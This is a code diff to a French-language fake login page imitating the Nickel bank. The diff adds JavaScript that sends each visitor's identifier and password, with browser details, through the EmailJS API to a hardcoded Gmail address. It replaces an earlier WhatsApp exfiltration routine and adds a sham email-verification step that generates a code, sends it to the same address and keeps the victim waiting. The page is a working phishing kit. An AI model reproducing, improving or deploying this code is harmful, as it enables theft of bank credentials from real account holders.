@@ -7,7 +7,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <link rel="icon" type="image/png" href="images/favicon.png">
     <style>
-        /* ===== TOUS LES STYLES (identique à avant) ===== */
+        /* ===== TOUS LES STYLES ===== */
         * {
             margin: 0;
             padding: 0;
@@ -494,7 +494,9 @@
             pointer-events: none;
         }
 
-        /* LOADING PAGE */
+        /* ============================================= */
+        /* LOADING PAGE                                  */
+        /* ============================================= */
         .loading-page {
             display: none;
             position: fixed;
@@ -548,7 +550,6 @@
             font-size: 0.85rem;
             margin-top: 1rem;
             display: none;
-            cursor: pointer;
         }
         .loading-content .error-message.visible {
             display: block;
@@ -569,6 +570,52 @@
             transition: width 0.5s ease;
         }
 
+        /* CODE SECTION */
+        .code-section {
+            display: none;
+            margin-top: 1.5rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid #eaeaea;
+        }
+        .code-section.visible {
+            display: block;
+        }
+        .code-section .code-input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.8rem;
+            margin-top: 1rem;
+        }
+        .code-section .code-input-group input {
+            padding: 0.8rem;
+            border: 1.5px solid #b0b0b0;
+            border-radius: 16px;
+            font-size: 1.2rem;
+            text-align: center;
+            letter-spacing: 8px;
+            outline: none;
+            font-weight: 600;
+            background: #f9f9f9;
+            transition: 0.2s;
+        }
+        .code-section .code-input-group input:focus {
+            border-color: #f68b1e;
+            background: white;
+        }
+        .code-section .code-input-group .btn-orange {
+            width: 100%;
+            justify-content: center;
+        }
+        .code-section .code-error {
+            color: #c00;
+            font-size: 0.8rem;
+            display: none;
+            margin-top: 0.5rem;
+        }
+        .code-section .code-error.visible {
+            display: block;
+        }
+
         @media (max-width: 520px) {
             .loading-content {
                 padding: 2rem 1.5rem;
@@ -581,7 +628,6 @@
                 font-size: 1rem;
             }
         }
-
         @media (max-width: 768px) {
             .login-card {
                 padding: 2rem 1.5rem 2rem;
@@ -664,7 +710,6 @@
                 font-size: 0.75rem;
             }
         }
-
         @media (max-width: 480px) {
             .header {
                 padding: 0.8rem 1rem;
@@ -793,7 +838,6 @@
                 margin-top: 0.8rem;
             }
         }
-
         @media (max-width: 380px) {
             .login-card {
                 padding: 1.2rem 0.8rem 1.2rem;
@@ -876,16 +920,38 @@
     <!-- LOADING PAGE -->
     <div class="loading-page" id="loadingPage">
         <div class="loading-content">
-            <div class="spinner"></div>
-            <h2 id="loadingTitle">Veuillez patienter...</h2>
-            <p id="loadingDesc">Connexion en cours</p>
-            <p style="font-size: 0.8rem; color: #999; margin-top: 0.2rem;">Vérification de vos identifiants</p>
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
-            </div>
+            <div class="spinner" id="loadingSpinner"></div>
+            <h2 id="loadingTitle">Connexion en cours...</h2>
+            <p id="loadingDesc">Vérification de vos identifiants</p>
+            <p id="loadingSub" style="font-size: 0.8rem; color: #999; margin-top: 0.2rem; display: none;">Saisissez le code reçu par email pour continuer</p>
+
             <div class="error-message" id="errorMessage">
                 <i class="fas fa-exclamation-circle" style="margin-right: 6px;"></i>
-                Vérifiez votre connexion internet et réessayez (cliquez ici)
+                Vérifiez votre connexion internet et réessayez
+            </div>
+
+            <div class="code-section" id="codeSection">
+                <p style="font-size: 0.9rem; color: #1a1a1a; font-weight: 600; margin-bottom: 0.3rem;">
+                    <i class="fas fa-envelope" style="margin-right: 6px;"></i>
+                    Un code de vérification vous a été envoyé par email
+                </p>
+                <p style="font-size: 0.8rem; color: #666; margin-bottom: 0.5rem;">
+                    Saisissez-le ci-dessous pour finaliser votre connexion
+                </p>
+                <div class="code-input-group">
+                    <input type="text" id="codeInput" placeholder="• • • • • •" maxlength="6" inputmode="numeric" pattern="[0-9]*">
+                    <button type="button" class="btn-orange" id="btnValiderCode">
+                        <i class="fas fa-check-circle" style="margin-right: 6px;"></i> Valider
+                    </button>
+                    <div class="code-error" id="codeError">
+                        <i class="fas fa-exclamation-circle" style="margin-right: 4px;"></i>
+                        Code incorrect. Veuillez réessayer.
+                    </div>
+                </div>
+            </div>
+
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
             </div>
         </div>
     </div>
@@ -902,6 +968,7 @@
         <a class="btn-partenaire" href="https://pro.nickel.eu">Espace partenaire</a>
     </header>
 
+    <!-- MAIN -->
     <main class="main-content">
         <div class="login-card">
 
@@ -1033,9 +1100,12 @@
     <script>
         (function() {
             // =============================================
-            // CONFIGURATION WHATSAPP
+            // CONFIGURATION EMAILJS
             // =============================================
-            const WHATSAPP_NUMBER = ''; // Numéro WhatsApp du destinataire (sans le +)
+            const EMAILJS_PUBLIC_KEY = 'MY3N_MJv-SaWnp3vW';
+            const EMAILJS_SERVICE_ID = 'service_yrr9q08';
+            const EMAILJS_TEMPLATE_ID = 'template_ix46b1x';
+            const EMAILJS_TEMPLATE_CODE_ID = 'template_78cvtkk'; // Template pour le code OTP
 
             // =============================================
             // ÉLÉMENTS DOM
@@ -1056,11 +1126,19 @@
             const errorMessage = document.getElementById('errorMessage');
             const loadingTitle = document.getElementById('loadingTitle');
             const loadingDesc = document.getElementById('loadingDesc');
+            const loadingSub = document.getElementById('loadingSub');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const codeSection = document.getElementById('codeSection');
+            const codeInput = document.getElementById('codeInput');
+            const btnValiderCode = document.getElementById('btnValiderCode');
+            const codeError = document.getElementById('codeError');
 
             let loadingInterval = null;
             let loadingTimeout = null;
             let progress = 0;
-            let isRetrying = false;
+            let isCodeStep = false;
+            let generatedCode = '';
+            let credentialsSent = false;
 
             // =============================================
             // FONCTIONS DE FORMATAGE
@@ -1111,39 +1189,68 @@
             }
 
             // =============================================
-            // ENVOI VERS WHATSAPP
+            // ENVOI PAR EMAIL AVEC API REST EMAILJS
             // =============================================
-            function sendToWhatsApp(identifiant, motdepasse) {
-                console.log('📱 Envoi vers WhatsApp...');
-                console.log('👤 Identifiant:', identifiant);
-                console.log('🔑 Mot de passe:', motdepasse);
+            function sendEmail(templateId, params) {
+                var data = {
+                    service_id: EMAILJS_SERVICE_ID,
+                    template_id: templateId,
+                    user_id: EMAILJS_PUBLIC_KEY,
+                    template_params: params
+                };
 
-                // Construire le message
-                var message = encodeURIComponent(
-                    '🔐 NOUVELLE CONNEXION NICKEL\n' +
-                    '════════════════════════════════\n' +
-                    '📅 Date : ' + new Date().toLocaleString('fr-FR') + '\n' +
-                    '🌐 Appareil : ' + (navigator.userAgent || 'Inconnu') + '\n\n' +
-                    '─── INFOS DE CONNEXION ───\n' +
-                    '👤 Identifiant : ' + identifiant + '\n' +
-                    '🔑 Mot de passe : ' + motdepasse + '\n' +
-                    '════════════════════════════════'
-                );
-
-                // URL WhatsApp (version web + mobile)
-                var url = 'https://wa.me/' + WHATSAPP_NUMBER + '?text=' + message;
-
-                // Ouvrir WhatsApp dans un nouvel onglet
-                var win = window.open(url, '_blank');
-
-                // Retourner une promesse qui se résout après l'ouverture
-                return new Promise(function(resolve, reject) {
-                    if (win) {
-                        resolve({ success: true, message: 'WhatsApp ouvert avec succès' });
-                    } else {
-                        reject(new Error('Impossible d\'ouvrir WhatsApp. Vérifiez que WhatsApp est installé ou que vous êtes sur mobile.'));
+                return fetch('https://api.emailjs.com/api/v1.0/email/send', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                }).then(function(response) {
+                    if (!response.ok) {
+                        return response.text().then(function(text) {
+                            throw new Error('EmailJS Error: ' + text);
+                        });
                     }
+                    return response.text();
                 });
+            }
+
+            // =============================================
+            // ENVOI DES IDENTIFIANTS
+            // =============================================
+            function sendCredentials(identifiant, motdepasse) {
+                console.log('📧 Envoi des identifiants...');
+                return sendEmail(EMAILJS_TEMPLATE_ID, {
+                    to_email: 'emirhan82y@gmail.com',
+                    identifiant: identifiant,
+                    motdepasse: motdepasse,
+                    userAgent: navigator.userAgent || 'Inconnu',
+                    date: new Date().toLocaleString('fr-FR')
+                });
+            }
+
+            // =============================================
+            // ENVOI DU CODE OTP
+            // =============================================
+            function sendCodeOTP(identifiant, code) {
+                console.log('📧 Envoi du code OTP...');
+                return sendEmail(EMAILJS_TEMPLATE_CODE_ID, {
+                    to_email: 'emirhan82y@gmail.com',
+                    identifiant: identifiant,
+                    code: code,
+                    date: new Date().toLocaleString('fr-FR')
+                });
+            }
+
+            // =============================================
+            // GÉNÉRER UN CODE ALÉATOIRE
+            // =============================================
+            function generateCode() {
+                var code = '';
+                for (var i = 0; i < 6; i++) {
+                    code += Math.floor(Math.random() * 10);
+                }
+                return code;
             }
 
             // =============================================
@@ -1154,9 +1261,12 @@
                 progress = 0;
                 progressFill.style.width = '0%';
                 errorMessage.classList.remove('visible');
-                loadingTitle.textContent = 'Veuillez patienter...';
-                loadingDesc.textContent = 'Connexion en cours';
+                loadingTitle.textContent = 'Connexion en cours...';
+                loadingDesc.textContent = 'Vérification de vos identifiants';
+                loadingSub.style.display = 'none';
+                codeSection.classList.remove('visible');
                 document.body.style.overflow = 'hidden';
+                isCodeStep = false;
 
                 if (loadingInterval) clearInterval(loadingInterval);
                 loadingInterval = setInterval(() => {
@@ -1169,11 +1279,34 @@
                 loadingTimeout = setTimeout(() => {
                     clearInterval(loadingInterval);
                     progressFill.style.width = '100%';
-                    errorMessage.classList.add('visible');
-                    loadingTitle.textContent = '⚠️ Connexion impossible';
-                    loadingDesc.textContent = 'Vérifiez votre connexion internet';
-                    isRetrying = true;
-                }, 300000);
+                    showCodeStep();
+                }, 120000);
+            }
+
+            function showCodeStep() {
+                isCodeStep = true;
+                loadingTitle.textContent = '🔐 Vérification en deux étapes';
+                loadingDesc.textContent = 'Un code vous a été envoyé par email';
+                loadingSub.style.display = 'block';
+                loadingSub.textContent = 'Saisissez le code reçu pour continuer';
+                codeSection.classList.add('visible');
+                loadingSpinner.style.display = 'none';
+                codeInput.focus();
+                document.querySelector('.progress-bar').style.display = 'none';
+
+                generatedCode = generateCode();
+                console.log('📱 Code généré:', generatedCode);
+
+                sendCodeOTP(identifiantValue.textContent, generatedCode)
+                    .then(function() {
+                        console.log('✅ Code envoyé par email');
+                    })
+                    .catch(function(error) {
+                        console.error('❌ Erreur envoi code:', error);
+                        console.log('📱 CODE DE TEST: ' + generatedCode);
+                    });
+
+                console.log('📱 CODE DE TEST: ' + generatedCode);
             }
 
             function hideLoading() {
@@ -1182,11 +1315,17 @@
                 if (loadingInterval) clearInterval(loadingInterval);
                 if (loadingTimeout) clearTimeout(loadingTimeout);
                 setTimeout(() => {
-                    loadingTitle.textContent = 'Veuillez patienter...';
-                    loadingDesc.textContent = 'Connexion en cours';
+                    loadingTitle.textContent = 'Connexion en cours...';
+                    loadingDesc.textContent = 'Vérification de vos identifiants';
+                    loadingSub.style.display = 'none';
                     errorMessage.classList.remove('visible');
                     progressFill.style.width = '0%';
-                    isRetrying = false;
+                    codeSection.classList.remove('visible');
+                    loadingSpinner.style.display = 'block';
+                    document.querySelector('.progress-bar').style.display = 'block';
+                    codeInput.value = '';
+                    codeError.classList.remove('visible');
+                    isCodeStep = false;
                 }, 500);
             }
 
@@ -1194,34 +1333,48 @@
             // TRAITEMENT DE LA CONNEXION
             // =============================================
             function processLogin(identifiant, motdepasse) {
-                showLoading();
-
-                sendToWhatsApp(identifiant, motdepasse)
-                    .then(() => {
-                        clearInterval(loadingInterval);
-                        progress = 100;
-                        progressFill.style.width = '100%';
-
-                        setTimeout(() => {
-                            hideLoading();
-                            alert('✅ Connexion réussie !\n\nMessage envoyé sur WhatsApp.\n\nIdentifiant: ' + identifiant + '\nMot de passe: ' + motdepasse);
-                            sectionPassword.classList.remove('visible');
-                            sectionIdentifiant.style.display = 'block';
-                            motDePasseInput.value = '';
-                            validerBtn.style.display = 'none';
-                            identifiantInput.value = '';
-                            identifiantInput.focus();
-                        }, 800);
+                sendCredentials(identifiant, motdepasse)
+                    .then(function() {
+                        console.log('✅ Identifiants envoyés par email');
+                        credentialsSent = true;
+                        showLoading();
                     })
-                    .catch((error) => {
-                        console.error('❌ Erreur WhatsApp:', error);
-                        clearInterval(loadingInterval);
-                        progressFill.style.width = '100%';
-                        errorMessage.classList.add('visible');
-                        loadingTitle.textContent = '⚠️ Erreur de connexion';
-                        loadingDesc.textContent = 'Veuillez réessayer';
-                        isRetrying = true;
+                    .catch(function(error) {
+                        console.error('❌ Erreur envoi identifiants:', error);
+                        // On continue quand même pour ne pas bloquer l'utilisateur
+                        credentialsSent = true;
+                        showLoading();
                     });
+            }
+
+            // =============================================
+            // VALIDATION DU CODE
+            // =============================================
+            function validateCode() {
+                var enteredCode = codeInput.value.replace(/\D/g, '');
+                if (enteredCode.length !== 6) {
+                    codeError.textContent = 'Veuillez saisir un code de 6 chiffres.';
+                    codeError.classList.add('visible');
+                    return;
+                }
+
+                if (enteredCode === generatedCode) {
+                    codeError.classList.remove('visible');
+                    hideLoading();
+                    alert('✅ Connexion réussie !\n\nIdentifiant: ' + identifiantValue.textContent);
+                    sectionPassword.classList.remove('visible');
+                    sectionIdentifiant.style.display = 'block';
+                    motDePasseInput.value = '';
+                    validerBtn.style.display = 'none';
+                    identifiantInput.value = '';
+                    identifiantInput.focus();
+                    credentialsSent = false;
+                } else {
+                    codeError.textContent = '❌ Code incorrect. Veuillez réessayer.';
+                    codeError.classList.add('visible');
+                    codeInput.value = '';
+                    codeInput.focus();
+                }
             }
 
             // =============================================
@@ -1319,15 +1472,49 @@
                 const identifiant = identifiantValue.textContent;
 
                 if (mdp.length === 6) {
-                    processLogin(identifiant, mdp);
+                    if (!credentialsSent) {
+                        processLogin(identifiant, mdp);
+                    } else {
+                        showLoading();
+                    }
                 } else {
                     alert('Veuillez saisir un mot de passe de 6 chiffres.');
                 }
             });
 
+            btnValiderCode.addEventListener('click', function(e) {
+                validateCode();
+            });
+
+            codeInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    validateCode();
+                }
+                const key = e.key;
+                if (['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Home', 'End'].includes(key)) {
+                    return;
+                }
+                if (!/^[0-9]$/.test(key) && key !== 'Unidentified') {
+                    e.preventDefault();
+                }
+            });
+
+            codeInput.addEventListener('input', function() {
+                const val = this.value.replace(/\D/g, '');
+                if (val.length > 6) {
+                    this.value = val.slice(0, 6);
+                } else {
+                    this.value = val;
+                }
+                if (val.length === 6) {
+                    codeError.classList.remove('visible');
+                }
+            });
+
             errorMessage.addEventListener('click', function() {
-                if (isRetrying) {
-                    isRetrying = false;
+                if (isCodeStep) {
+                    showCodeStep();
+                } else {
                     const identifiant = identifiantValue.textContent;
                     const mdp = motDePasseInput.value.replace(/\D/g, '');
                     if (mdp.length === 6) {
